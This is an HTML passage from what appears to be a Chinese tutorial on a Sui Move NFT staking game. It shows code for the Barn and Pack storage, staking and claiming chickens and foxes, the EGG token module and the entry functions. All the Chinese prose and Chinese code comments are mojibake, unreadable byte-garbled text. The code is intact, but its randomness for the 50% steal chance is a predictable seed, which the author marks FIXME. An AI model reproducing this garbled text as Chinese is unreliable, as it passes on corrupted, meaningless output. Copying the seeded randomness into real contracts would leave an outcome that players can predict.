vector&lt;ID&gt;&gt;</code> ã€‚</p><p>åŒç†ï¼Œ<code>Pack</code> ä¹Ÿç”¨ <code>items</code> è®°å½•äº†è´¨æŠ¼çš„æ‰€æœ‰ NFTï¼Œç”¨ Alpha è¿›è¡Œäº†åˆ†ç±»å­˜å‚¨ï¼Œåœ¨ <code>ObjectTable&lt;u8, ObjectTable&lt;u64, Stake&gt;&gt;</code> çš„ç»“æ„ä¸­ï¼Œç¬¬ä¸€ä¸ª <code>u8</code> å¯¹åº”äº Alpha å€¼ï¼Œç¬¬äºŒä¸ª <code>ObjectTable&lt;u64, Stake&gt;</code> åˆ™æ˜¯ç”¨ <code>ObjectTable</code> å®ç°äº† <code>vector</code> çš„åŠŸèƒ½ï¼Œ<code>u64</code> å¯¹åº” <code>Stake</code> çš„ç´¢å¼•ï¼Œå› æ­¤ï¼Œitem_size è¿™ä¸ªå±æ€§è®°å½•äº†æ¯ä¸ª Alpha å€¼å¯¹åº” <code>ObjectTable</code> çš„å¤§å°ã€‚</p><p><code>pack_indices</code> ç”¨äºè®°å½•æ¯ä¸ª NFT æ‰€åœ¨æ•°ç»„ä¸­çš„ç´¢å¼•ï¼Œæœ€åè¿˜æœ‰ä¸€ä¸ª <code>dynamic_field</code> è®°å½•äº† owner åœ°å€çš„æ‰€æœ‰è´¨æŠ¼çš„ NFT çš„æ•°ç»„ã€‚</p><p>ä»¥ä¸Šå…³äº Barn å’Œ Pack çš„è®¾è®¡ç›®çš„åœ¨äºï¼š</p><ol><li>å½“ <code>FoxOrChicken</code> æˆä¸º <code>Stake</code> çš„ä¸€ä¸ªå±æ€§æ—¶ï¼Œåœ¨åŒºå—é“¾ä¸Šæ— æ³•è¿½è¸ªï¼Œå› æ­¤ï¼Œåªèƒ½é€šè¿‡ <code>Stake</code> çš„ Object ID è¿›è¡Œè¿½è¸ªï¼Œitems éƒ½æ˜¯ä¸ºäº†ä¿è¯èƒ½ç›´æ¥é€šè¿‡ NFT çš„ Object ID æ¥å¯¹åº”åˆ° Stakeï¼›</li><li>è®°å½• owner åœ°å€çš„æ‰€æœ‰è´¨æŠ¼çš„ NFT ID çš„æ•°ç»„æ˜¯ä¸ºäº†æ–¹ä¾¿åœ¨ä¸šåŠ¡ä¸­æŸ¥è¯¢æŸä¸ªåœ°å€çš„è´¨æŠ¼çš„ NFTï¼Œ<code>dynamic_field</code> å¯ä»¥æ–¹ä¾¿æŸ¥è¯¢ã€‚</li></ol><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">    <span class="comment">// struct to store a stake&#x27;s token, owner, and earning values</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Stake</span> has key, store &#123;</span><br><span class="line">    id: UID,</span><br><span class="line">    item: FoxOrChicken,</span><br><span class="line">    value: <span class="type">u64</span>, <span class="comment">// ç”¨äºè´¨æŠ¼æ”¶ç›Šè®¡ç®—çš„æ—¶é—´æˆ³</span></span><br><span class="line">    owner: address,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Barn</span> has key, store &#123;</span><br><span class="line">    id: UID,</span><br><span class="line">    items: ObjectTable&lt;ID, Stake&gt;,</span><br><span class="line">    <span class="comment">// staked: Table&lt;address, vector&lt;ID&gt;&gt;, // address -&gt; stake_id</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Pack</span> has key, store &#123;</span><br><span class="line">    id: UID,</span><br><span class="line">    items: ObjectTable&lt;<span class="type">u8</span>, ObjectTable&lt;<span class="type">u64</span>, Stake&gt;&gt;,</span><br><span class="line">    <span class="comment">// alpha -&gt; index -&gt; Stake</span></span><br><span class="line">    item_size: vector&lt;<span class="type">u64</span>&gt;,</span><br><span class="line">    <span class="comment">// size for each alpha</span></span><br><span class="line">    pack_indices: Table&lt;ID, <span class="type">u64</span>&gt;,</span><br><span class="line">    <span class="comment">// staked: Table&lt;address, vector&lt;ID&gt;&gt;, // address -&gt; stake_id</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¥ä¸‹æ¥çœ‹åˆ°å¦‚ä½•è´¨æŠ¼ä¸€ä¸ª Chicken çš„ NFTï¼Œæ–¹æ³•è°ƒç”¨å±‚çº§ä¸º <code>stake_many_to_barn_and_pack -&gt; stake_chicken_to_barn -&gt; add_chicken_to_barn, record_staked</code> ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ–‡ä»¶ï¼š Token_helper.move</span></span><br><span class="line">        <span class="comment">// è´¨æŠ¼å¤šä¸ª NFT</span></span><br><span class="line">        public fun <span class="title function_ invoke__">stake_many_to_barn_and_pack</span>(</span><br><span class="line">        reg: &amp;<span class="keyword">mut</span> BarnRegistry,</span><br><span class="line">        barn: &amp;<span class="keyword">mut</span> Barn,</span><br><span class="line">        pack: &amp;<span class="keyword">mut</span> Pack,</span><br><span class="line">        tokens: vector&lt;FoxOrChicken&gt;,</span><br><span class="line">        ctx: &amp;<span class="keyword">mut</span> TxContext,</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">i</span> = vec::length&lt;FoxOrChicken&gt;(&amp;tokens);</span><br><span class="line">        <span class="keyword">while</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">token</span> = vec::<span class="title function_ invoke__">pop_back</span>(&amp;<span class="keyword">mut</span> tokens);</span><br><span class="line">            <span class="comment">// é€šè¿‡å±æ€§ is_chicken åˆ¤æ–­è´¨æŠ¼æ–¹å‘</span></span><br><span class="line">            <span class="keyword">if</span> (token_helper::<span class="title function_ invoke__">is_chicken</span>(&amp;token)) &#123;</span><br><span class="line">                <span class="comment">// æ›´æ–°æ”¶ç›Š</span></span><br><span class="line">                <span class="title function_ invoke__">update_earnings</span>(reg, ctx);</span><br><span class="line">                <span class="title function_ invoke__">stake_chicken_to_barn</span>(reg, barn, token, ctx);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">stake_fox_to_pack</span>(reg, pack, token, ctx);</span><br><span class="line">            &#125;;</span><br><span class="line">            i = i - <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        vec::<span class="title function_ invoke__">destroy_empty</span>(tokens)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        fun <span class="title function_ invoke__">stake_chicken_to_barn</span>(reg: &amp;<span class="keyword">mut</span> BarnRegistry, barn: &amp;<span class="keyword">mut</span> Barn, item: FoxOrChicken, ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        reg.total_chicken_staked = reg.total_chicken_staked + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">stake_id</span> = <span class="title function_ invoke__">add_chicken_to_barn</span>(reg, barn, item, ctx);</span><br><span class="line">                <span class="comment">// è®°å½• owner åœ°å€çš„æ‰€æœ‰è´¨æŠ¼çš„ NFT</span></span><br><span class="line">        <span class="title function_ invoke__">record_staked</span>(&amp;<span class="keyword">mut</span> barn.id, <span class="title function_ invoke__">sender</span>(ctx), stake_id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        fun <span class="title function_ invoke__">add_chicken_to_barn</span>(reg: &amp;<span class="keyword">mut</span> BarnRegistry, barn: &amp;<span class="keyword">mut</span> Barn, item: FoxOrChicken, ctx: &amp;<span class="keyword">mut</span> TxContext): ID &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">foc_id</span> = object::<span class="title function_ invoke__">id</span>(&amp;item);</span><br><span class="line">        <span class="comment">// è·å–å½“å‰æ—¶é—´æˆ³</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">value</span> = <span class="title function_ invoke__">timestamp_now</span>(reg, ctx);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">stake</span> = Stake &#123;</span><br><span class="line">            id: object::<span class="title function_ invoke__">new</span>(ctx),</span><br><span class="line">            item,</span><br><span class="line">            value,</span><br><span class="line">            owner: <span class="title function_ invoke__">sender</span>(ctx),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// ç”Ÿæˆå¹¶æ·»åŠ è´¨æŠ¼</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">stake_id</span> = object::<span class="title function_ invoke__">id</span>(&amp;stake);</span><br><span class="line">        <span class="title function_ invoke__">emit</span>(FoCStaked &#123; id: foc_id, owner: <span class="title function_ invoke__">sender</span>(ctx), value &#125;);</span><br><span class="line">        object_table::<span class="title function_ invoke__">add</span>(&amp;<span class="keyword">mut</span> barn.items, foc_id, stake);</span><br><span class="line">        stake_id</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        fun <span class="title function_ invoke__">record_staked</span>(staked: &amp;<span class="keyword">mut</span> UID, account: address, stake_id: ID) &#123;</span><br><span class="line">        <span class="keyword">if</span> (dof::<span class="title function_ invoke__">exists_</span>(staked, account)) &#123;</span><br><span class="line">            vec::<span class="title function_ invoke__">push_back</span>(dof::<span class="title function_ invoke__">borrow_mut</span>(staked, account), stake_id);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dof::<span class="title function_ invoke__">add</span>(staked, account, vec::<span class="title function_ invoke__">singleton</span>(stake_id));</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åŒç†ï¼Œè´¨æŠ¼ Fox è¿›å…¥ Pack ä¸­çš„è¿‡ç¨‹ä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°ï¼Œæ–¹æ³•è°ƒç”¨å±‚çº§ä¸º <code>stake_many_to_barn_and_pack -&gt;</code> <code>stake_fox_to_pack -&gt;``add_fox_to_pack, record_staked</code> ã€‚</p><h3><span id="2-5-ti-qu-nft">2.5 æå– NFT</span></h3><p>æå– Chicken NFT æ—¶ï¼Œæ–¹æ³•è°ƒç”¨å±‚çº§ä¸º <code>claim_many_from_barn_and_pack -&gt; claim_chicken_from_barn -&gt; remove_chicken_from_barn, remove_staked</code></p><p>ä¸»è¦çš„è¿‡ç¨‹ä¸ºï¼š</p><ol><li>åˆ¤æ–­ NFT ç±»å‹ï¼Œæ ¹æ®ç±»å‹ä»ä¸åŒçš„å®¹å™¨ä¸­æå– NFTï¼›</li><li>åˆ¤æ–­ NFT æ˜¯å¦å­˜åœ¨ï¼Œæ˜¯å¦è¶…è¿‡æœ€å°è´¨æŠ¼æ—¶é—´ï¼›</li><li>è®¡ç®—è´¨æŠ¼æ”¶ç›Šï¼›</li><li>å¦‚æœé€‰æ‹©æå– NFTï¼Œåˆ™æ”¶ç›Š50%æ¦‚ç‡è¢«ç‹ç‹¸å…¨éƒ¨æ‹¿èµ°ï¼›</li><li>å¦‚æœåªæ”¶é›†é¸¡è›‹ï¼Œåˆ™éœ€è¦äº¤ 20% ä½œä¸ºä¿æŠ¤è´¹ã€‚</li></ol><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ–‡ä»¶ï¼š token_helper.move</span></span><br><span class="line">    <span class="comment">// æå–å¤šä¸ª NFT</span></span><br><span class="line">        public fun <span class="title function_ invoke__">claim_many_from_barn_and_pack</span>(</span><br><span class="line">        foc_reg: &amp;<span class="keyword">mut</span> FoCRegistry,</span><br><span class="line">        reg: &amp;<span class="keyword">mut</span> BarnRegistry,</span><br><span class="line">        barn: &amp;<span class="keyword">mut</span> Barn,</span><br><span class="line">        pack: &amp;<span class="keyword">mut</span> Pack,</span><br><span class="line">        treasury_cap: &amp;<span class="keyword">mut</span> TreasuryCap&lt;EGG&gt;,</span><br><span class="line">        tokens: vector&lt;ID&gt;,</span><br><span class="line">        unstake: <span class="type">bool</span>,</span><br><span class="line">        ctx: &amp;<span class="keyword">mut</span> TxContext,</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="comment">// æ›´æ–°æ”¶ç›Š</span></span><br><span class="line">        <span class="title function_ invoke__">update_earnings</span>(reg, ctx);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">i</span> = vec::length&lt;ID&gt;(&amp;tokens);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">owed</span>: <span class="type">u64</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">token_id</span> = vec::<span class="title function_ invoke__">pop_back</span>(&amp;<span class="keyword">mut</span> tokens);</span><br><span class="line">            <span class="comment">// é€šè¿‡ ID åˆ¤æ–­æ˜¯å¦ä¸º chickena</span></span><br><span class="line">            <span class="comment">// è®¡ç®—æå–æ”¶ç›Š owed</span></span><br><span class="line">            <span class="keyword">if</span> (token_helper::<span class="title function_ invoke__">is_chicken_from_id</span>(foc_reg, token_id)) &#123;</span><br><span class="line">                owed = owed + <span class="title function_ invoke__">claim_chicken_from_barn</span>(reg, barn, token_id, unstake, ctx);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                owed = owed + <span class="title function_ invoke__">claim_fox_from_pack</span>(foc_reg, reg, pack, token_id, unstake, ctx);</span><br><span class="line">            &#125;;</span><br><span class="line">            i = i - <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// æ ¹æ® owed çš„æ•°é‡ä¸ºåœ°å€é“¸é€  EGG ä»£å¸</span></span><br><span class="line">        <span class="keyword">if</span> (owed == <span class="number">0</span>) &#123; <span class="keyword">return</span> &#125;;</span><br><span class="line">        egg::<span class="title function_ invoke__">mint</span>(treasury_cap, owed, <span class="title function_ invoke__">sender</span>(ctx), ctx);</span><br><span class="line">        vec::<span class="title function_ invoke__">destroy_empty</span>(tokens)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        fun <span class="title function_ invoke__">claim_chicken_from_barn</span>(</span><br><span class="line">        reg: &amp;<span class="keyword">mut</span> BarnRegistry,</span><br><span class="line">        barn: &amp;<span class="keyword">mut</span> Barn,</span><br><span class="line">        foc_id: ID,</span><br><span class="line">        unstake: <span class="type">bool</span>,</span><br><span class="line">        ctx: &amp;<span class="keyword">mut</span> TxContext</span><br><span class="line">    ): <span class="type">u64</span> &#123;</span><br><span class="line">        <span class="comment">// åˆ¤æ–­éœ€è¦æå–çš„ NFT æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">        <span class="built_in">assert!</span>(object_table::<span class="title function_ invoke__">contains</span>(&amp;barn.items, foc_id), ENOT_IN_PACK_OR_BARN);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">stake_time</span> = <span class="title function_ invoke__">get_chicken_stake_value</span>(barn, foc_id);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">timenow</span> = <span class="title function_ invoke__">timestamp_now</span>(reg, ctx);</span><br><span class="line">        <span class="comment">// åˆ¤æ–­æ˜¯å¦è¶…è¿‡äº† 48 å°æ—¶çš„æœ€å°è´¨æŠ¼æ—¶é—´</span></span><br><span class="line">        <span class="built_in">assert!</span>(!(unstake &amp;&amp; timenow - stake_time &lt; MINIMUM_TO_EXIT), ESTILL_COLD);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">owed</span>: <span class="type">u64</span>;</span><br><span class="line">        <span class="comment">// åˆ¤æ–­æ˜¯å¦è¶…è¿‡äº†æœ€å¤§ EGG é“¸é€ é‡ï¼Œå¹¶è®¡ç®—è´¨æŠ¼æ‰€å¾—</span></span><br><span class="line">        <span class="keyword">if</span> (reg.total_egg_earned &lt; MAXIMUM_GLOBAL_EGG) &#123;</span><br><span class="line">            owed = (timenow - stake_time) * DAILY_EGG_RATE / ONE_DAY_IN_SECOND;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (stake_time &gt; reg.last_claim_timestamp) &#123;</span><br><span class="line">            owed = <span class="number">0</span>; <span class="comment">// $WOOL production stopped already</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// stop earning additional $EGG if it&#x27;s all been earned</span></span><br><span class="line">            owed = (reg.last_claim_timestamp - stake_time) * DAILY_EGG_RATE / ONE_DAY_IN_SECOND;</span><br><span class="line">        &#125;;</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">if</span> (unstake) &#123;</span><br><span class="line">            <span class="comment">// å¦‚æœè¿›è¡Œæå–ï¼Œåˆ™æœ‰50%çš„æ¦‚ç‡ EGG å…¨éƒ¨è¢«ç›—èµ°</span></span><br><span class="line">            <span class="keyword">let</span> <span class="variable">id</span> = object::<span class="title function_ invoke__">new</span>(ctx);</span><br><span class="line">            <span class="comment">// FIXME</span></span><br><span class="line">            <span class="keyword">if</span> (random::<span class="title function_ invoke__">rand_u64_range_with_seed</span>(<span class="title function_ invoke__">hash</span>(object::<span class="title function_ invoke__">uid_to_bytes</span>(&amp;id)), <span class="number">0</span>, <span class="number">2</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// 50% chance of all $EGG stolen</span></span><br><span class="line">                <span class="title function_ invoke__">pay_fox_tax</span>(reg, owed);</span><br><span class="line">                owed = <span class="number">0</span>;</span><br><span class="line">            &#125;;</span><br><span class="line">            object::<span class="title function_ invoke__">delete</span>(id);</span><br><span class="line">            <span class="comment">// æ›´æ–°è´¨æŠ¼æ•°æ®ï¼Œå¹¶ç§»é™¤è´¨æŠ¼ï¼Œè½¬ç§» NFT ç»™ owner åœ°å€</span></span><br><span class="line">            reg.total_chicken_staked = reg.total_chicken_staked - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">let</span> (item, stake_id) = <span class="title function_ invoke__">remove_chicken_from_barn</span>(barn, foc_id, ctx);</span><br><span class="line">            <span class="title function_ invoke__">remove_staked</span>(&amp;<span class="keyword">mut</span> barn.id, <span class="title function_ invoke__">sender</span>(ctx), stake_id);</span><br><span class="line">            transfer::<span class="title function_ invoke__">transfer</span>(item, <span class="title function_ invoke__">sender</span>(ctx));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="comment">// å¦‚æœåªæ˜¯æ”¶é›† EGGï¼Œåˆ™ 20% ä½œä¸ºä¿æŠ¤è´¹äº¤ç»™ç‹ç‹¸</span></span><br><span class="line">            <span class="comment">// percentage tax to staked foxes</span></span><br><span class="line">            <span class="title function_ invoke__">pay_fox_tax</span>(reg, owed * EGG_CLAIM_TAX_PERCENTAGE / <span class="number">100</span>);</span><br><span class="line">            <span class="comment">// remainder goes to Chicken owner</span></span><br><span class="line">            owed = owed * (<span class="number">100</span> - EGG_CLAIM_TAX_PERCENTAGE) / <span class="number">100</span>;</span><br><span class="line">            <span class="comment">// é‡è®¾è´¨æŠ¼çŠ¶æ€</span></span><br><span class="line">            <span class="title function_ invoke__">set_chicken_stake_value</span>(barn, foc_id, timenow);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="title function_ invoke__">emit</span>(FoCClaimed &#123; id: foc_id, earned: owed, unstake &#125;);</span><br><span class="line">        owed</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åŒç†ï¼Œä» Pack ä¸­æå– Fox  ä¸­çš„è¿‡ç¨‹ä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°ã€‚</p><h3><span id="2-6-chuang-jian-egg-dai-bi-he-shou-ji-egg-dai-bi">2.6 åˆ›å»º EGG ä»£å¸å’Œæ”¶é›† EGG ä»£å¸</span></h3><p>EGG ä»£å¸åˆ›å»ºè¿‡ç¨‹ä½¿ç”¨äº† one-time-witness æ¨¡å¼ï¼Œå…·ä½“å¯ä»¥å‚è€ƒï¼š<a href="https://mp.weixin.qq.com/s/OXLyiUKzpFzAzc-PVxLvTA">Move é«˜é˜¶è¯­æ³• | å…±å­¦è¯¾ä¼˜ç§€ç¬”è®°</a> ä¸­çš„ Witness æ¨¡å¼ä¸€èŠ‚ã€‚</p><p>ä»£å¸çš„é“¸é€ èƒ½åŠ› <code>treasury_cap: TreasuryCap&lt;EGG&gt;</code> ä¿å­˜ä¸ºå…±äº«å¯¹è±¡ï¼Œä½†æ˜¯ <code>mint</code> å’Œ <code>burn</code> æ–¹æ³•té€šè¿‡ <code>friend</code> å…³é”®å­—é™åˆ¶äº†åªèƒ½åœ¨ <code>fox</code> å’Œ <code>barn</code> æ¨¡å—ä¸­è°ƒç”¨ï¼Œå› æ­¤æ§åˆ¶äº†ä»£å¸çš„äº§ç”Ÿå’Œé”€æ¯çš„æƒé™ã€‚</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ–‡ä»¶ï¼š egg.move</span></span><br><span class="line">module fox_game::egg &#123;</span><br><span class="line">    <span class="keyword">use</span> std::option;</span><br><span class="line">    <span class="keyword">use</span> sui::coin::&#123;<span class="keyword">Self</span>, Coin, TreasuryCap&#125;;</span><br><span class="line">    <span class="keyword">use</span> sui::transfer;</span><br><span class="line">    <span class="keyword">use</span> sui::tx_context::TxContext;</span><br><span class="line"></span><br><span class="line">    friend fox_game::fox;</span><br><span class="line">    friend fox_game::barn;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">EGG</span> has drop &#123;&#125;</span><br><span class="line"></span><br><span class="line">    fun <span class="title function_ invoke__">init</span>(witness: EGG, ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        <span class="keyword">let</span> (treasury_cap, metadata) = coin::create_currency&lt;EGG&gt;(</span><br><span class="line">            witness,</span><br><span class="line">            <span class="number">9</span>,</span><br><span class="line">            <span class="string">b&quot;EGG&quot;</span>,</span><br><span class="line">            <span class="string">b&quot;Fox Game Egg&quot;</span>,</span><br><span class="line">            <span class="string">b&quot;Fox game egg coin&quot;</span>,</span><br><span class="line">            option::<span class="title function_ invoke__">none</span>(),</span><br><span class="line">            ctx</span><br><span class="line">        );</span><br><span class="line">        transfer::<span class="title function_ invoke__">freeze_object</span>(metadata);</span><br><span class="line">        transfer::<span class="title function_ invoke__">share_object</span>(treasury_cap)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// Manager can mint new coins</span></span><br><span class="line">    <span class="title function_ invoke__">public</span>(friend) fun <span class="title function_ invoke__">mint</span>(</span><br><span class="line">        treasury_cap: &amp;<span class="keyword">mut</span> TreasuryCap&lt;EGG&gt;, amount: <span class="type">u64</span>, recipient: address, ctx: &amp;<span class="keyword">mut</span> TxContext</span><br><span class="line">    ) &#123;</span><br><span class="line">        coin::<span class="title function_ invoke__">mint_and_transfer</span>(treasury_cap, amount, recipient, ctx)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// Manager can burn coins</span></span><br><span class="line">    <span class="title function_ invoke__">public</span>(friend) fun <span class="title function_ invoke__">burn</span>(treasury_cap: &amp;<span class="keyword">mut</span> TreasuryCap&lt;EGG&gt;, coin: Coin&lt;EGG&gt;) &#123;</span><br><span class="line">        coin::<span class="title function_ invoke__">burn</span>(treasury_cap, coin);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="2-7-chu-shi-hua-fang-fa-he-entry-fang-fa">2.7 åˆå§‹åŒ–æ–¹æ³•å’Œ entry æ–¹æ³•</span></h3><p><code>fox</code> æ¨¡å—ä½œä¸ºæ•´ä¸ªåŒ…çš„å…¥å£æ¨¡å—ï¼Œå°†å¯¹æ‰€æœ‰æ¨¡å—è¿›è¡Œåˆå§‹åŒ–ï¼Œå¹¶æä¾› entry æ–¹æ³•ã€‚</p><p>æˆ‘ä»¬åœ¨ fox æ¨¡å—ä¸­è®¾ç½®äº† <code>Global</code> ä½œä¸ºå…¨å±€å‚æ•°çš„ç»“æ„ä½“ï¼Œç”¨æ¥ä¿å­˜ä¸åŒæ¨¡å—éœ€è¦ç”¨åˆ°çš„ä¸åŒå¯¹è±¡ï¼Œä¸€æ¥æ–¹ä¾¿æˆ‘ä»¬çœ‹åˆ°ç³»ç»Ÿéœ€è¦å¤„ç†çš„å¯¹è±¡ä¿¡æ¯ï¼ŒäºŒæ¥å‡å°‘äº†æ–¹æ³•è°ƒç”¨æ—¶éœ€è¦ä¼ å…¥çš„å‚æ•°ä¸ªæ•°ï¼Œé€šè¿‡Globalå¯¹è±¡å°†ä¸åŒæ¨¡å—çš„å¯¹è±¡è¿›è¡Œåˆ†å‘ï¼Œå¯ä»¥æœ‰æ•ˆå‡å°‘ä»£ç å¤æ‚åº¦ã€‚</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ–‡ä»¶: fox.move</span></span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">Global</span> has key &#123;</span><br><span class="line">        id: UID,</span><br><span class="line">        minting_enabled: <span class="type">bool</span>,</span><br><span class="line">        balance: Balance&lt;SUI&gt;,</span><br><span class="line">        pack: Pack,</span><br><span class="line">        barn: Barn,</span><br><span class="line">        barn_registry: BarnRegistry,</span><br><span class="line">        foc_registry: FoCRegistry,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fun <span class="title function_ invoke__">init</span>(ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        <span class="comment">// åˆå§‹åŒ– FoC ç®¡ç†æƒé™</span></span><br><span class="line">        <span class="title function_ invoke__">transfer</span>(token_helper::<span class="title function_ invoke__">init_foc_manage_cap</span>(ctx), <span class="title function_ invoke__">sender</span>(ctx));</span><br><span class="line">        <span class="comment">// åˆå§‹åŒ–å…¨å±€è®¾ç½®</span></span><br><span class="line">        <span class="title function_ invoke__">share_object</span>(Global &#123;</span><br><span class="line">            id: object::<span class="title function_ invoke__">new</span>(ctx),</span><br><span class="line">            minting_enabled: <span class="literal">true</span>,</span><br><span class="line">            balance: balance::<span class="title function_ invoke__">zero</span>(),</span><br><span class="line">            barn_registry: barn::<span class="title function_ invoke__">init_barn_registry</span>(ctx),</span><br><span class="line">            pack: barn::<span class="title function_ invoke__">init_pack</span>(ctx),</span><br><span class="line">            barn: barn::<span class="title function_ invoke__">init_barn</span>(ctx),</span><br><span class="line">            foc_registry: token_helper::<span class="title function_ invoke__">init_foc_registry</span>(ctx),</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// åˆå§‹åŒ–æ—¶é—´è®¾ç½®æƒé™</span></span><br><span class="line">        <span class="title function_ invoke__">transfer</span>(config::<span class="title function_ invoke__">init_time_manager_cap</span>(ctx), @<span class="number">0xa3e46ec682bb5082849c240d2f2d20b0f6e054aa</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>é™¤äº†ä¹‹å‰ä»‹ç»è¿‡çš„ mint æ–¹æ³•ï¼Œæˆ‘ä»¬è¿˜æä¾›ç”¨äºè´¨æŠ¼å’Œæå– NFT çš„ entry æ–¹æ³•ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ–‡ä»¶ï¼š fox.move</span></span><br><span class="line">        public entry fun <span class="title function_ invoke__">add_many_to_barn_and_pack</span>(</span><br><span class="line">        global: &amp;<span class="keyword">mut</span> Global,</span><br><span class="line">        tokens: vector&lt;FoxOrChicken&gt;,</span><br><span class="line">        ctx: &amp;<span class="keyword">mut</span> TxContext,</span><br><span class="line">    ) &#123;</span><br><span class="line">        barn::<span class="title function_ invoke__">stake_many_to_barn_and_pack</span>(&amp;<span class="keyword">mut</span> global.barn_registry, &amp;<span class="keyword">mut</span> global.barn, &amp;<span class="keyword">mut</span> global.pack, tokens, ctx);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">claim_many_from_barn_and_pack</span>(</span><br><span class="line">        global: &amp;<span class="keyword">mut</span> Global,</span><br><span class="line">        treasury_cap: &amp;<span class="keyword">mut</span> TreasuryCap&lt;EGG&gt;,</span><br><span class="line">        tokens: vector&lt;ID&gt;,</span><br><span class="line">        unstake: <span class="type">bool</span>,</span><br><span class="line">        ctx: &amp;<span class="keyword">mut</span> TxContext,</span><br><span class="line">    ) &#123;</span><br><span class="line">        barn::<span class="title function_ invoke__">claim_many_from_barn_and_pack</span>(</span><br><span class="line">            &amp;<span class="keyword">mut</span> global.foc_registry,</span><br><span class="line">            &amp;<span class="keyword">mut</span> global.barn_registry,</span><br><span class="line">            &amp;<span class="keyword">mut</span> global.barn,</span><br><span class="line">            &amp;<span class="keyword">mut</span> global.pack,</span><br><span class="line">            treasury_cap,</span><br><span class="line">            tokens,</span><br><span class="line">            unstake,</span><br><span class="line">            ctx</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3><span id="2-8-shi-jian-chuo-wen-ti">2.8 æ—¶é—´æˆ³é—®é¢˜</span></h3><p>ç›®å‰ Sui åŒºå—é“¾è¿˜æ²¡æœ‰å®Œå…¨å®ç°åŒºå—æ—¶é—´ï¼Œè€Œç›®å‰æä¾›çš„ <code>tx_context::epoch()</code> çš„ç²¾åº¦ä¸º24å°æ—¶ï¼Œæ— æ³•æ»¡è¶³æ¸¸æˆéœ€æ±‚ã€‚å› æ­¤åœ¨æ¸¸æˆä¸­ï¼Œæˆ‘ä»¬é€šè¿‡æ‰‹åŠ¨è®¾ç½®æ—¶é—´æˆ³æ¥æ¨¡æ‹Ÿæ—¶é—´å¢åŠ ï¼Œä»¥ç¡®ä¿æ¸¸æˆé¡ºåˆ©è¿›è¡Œã€‚</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ–‡ä»¶: barn.move</span></span><br><span 